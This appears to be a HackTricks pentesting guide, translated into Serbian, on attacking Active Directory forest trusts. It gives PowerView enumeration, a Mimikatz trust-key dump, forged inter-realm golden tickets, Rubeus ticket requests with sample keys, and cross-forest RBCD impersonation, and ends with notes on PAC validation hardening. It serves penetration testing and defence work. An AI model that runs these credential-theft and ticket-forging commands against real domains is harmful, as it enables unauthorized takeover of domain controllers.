# External Forest Domain - OneWay (Inbound) ili bidirectional

{{#include ../../banners/hacktricks-training.md}}

U ovom scenariju spoljni domen veruje vašem domenu (ili oba domena veruju jedan drugom), pa možete ostvariti neku vrstu pristupa njemu.

## Enumeration

Pre svega, potrebno je da **enumerate** **trust** odnos:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` omogućavaju vam da brzo utvrdite da li će putevi za abuse između forest-a (RBCD, SIDHistory) verovatno funkcionisati bez dodatnih preduslova.<sup>[[2]](#references)</sup>

U prethodnoj enumeraciji je utvrđeno da se korisnik **`crossuser`** nalazi u grupi **`External Admins`**, koja ima **Admin pristup** DC-u eksternog domena.

## Početni pristup

Ako niste mogli da pronađete nikakav **poseban** pristup svog korisnika u drugom domenu, i dalje možete da se vratite na AD Methodology i pokušate **privesc sa neprivilegovanog korisnika** (na primer, tehnike kao što je kerberoasting):

Možete koristiti **Powerview funkcije** za **enumeraciju** **drugog domena** pomoću parametra `-Domain`, kao u primeru:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Prijavljivanje

Koristeći uobičajeni metod sa akreditivima korisnika koji imaju pristup eksternom domenu, trebalo bi da možete da mu pristupite:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Zloupotreba SID History

Takođe možete zloupotrebiti [**SID History**](sid-history-injection.md) preko forest trust-a.

Ako se korisnik migrira **iz jednog forest-a u drugi** i **SID Filtering nije omogućen**, postaje moguće **dodati SID iz drugog forest-a**, a ovaj **SID** će biti **dodat u token korisnika** prilikom autentikacije **preko trust-a**.

> [!WARNING]
> Kao podsetnik, signing key možete dobiti pomoću
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Možete **potpisati pomoću** **trusted** key-a **TGT koji se predstavlja kao** korisnik trenutnog domena.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Potpuna impersonacija korisnika
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD kada kontrolišete machine account u trusting forest-u (bez SID filtering-a / selective auth-a)

Ako vas foreign principal (FSP) ubaci u grupu koja može da upisuje computer objekte u trusting forest-u (npr. `Account Operators`, prilagođena provisioning grupa), možete da konfigurišete **Resource-Based Constrained Delegation** na ciljnom hostu tog forest-a i da se predstavljate kao bilo koji korisnik u njemu:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Ovo funkcioniše samo kada je **SelectiveAuthentication onemogućen** i kada **SID filtering** ne uklanja vaš SID za kontrolu. To je brz lateralni put koji zaobilazi falsifikovanje SIDHistory-a i često se previdi tokom provere trustova.<sup>[[2]](#references)</sup>

### Ojačavanje PAC validacije

Ažuriranja validacije PAC potpisa za **CVE-2024-26248**/**CVE-2024-29056** uvode obavezno potpisivanje inter-forest tiketa. U režimu **Compatibility mode**, falsifikovani inter-realm PAC/SIDHistory/S4U putevi i dalje mogu funkcionisati na nezakrpljenim DC-ovima. U režimu **Enforcement mode**, nepotpisani ili izmenjeni PAC podaci koji prelaze forest trust odbacuju se, osim ako takođe posedujete trust ključ ciljnog forest-a. Registry override-i (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) mogu oslabiti ovu zaštitu dok su još dostupni.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Promene PAC validacije za CVE-2024-26248 i CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC spec – Detalji SID filtering-a i transformacije claim-ova](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
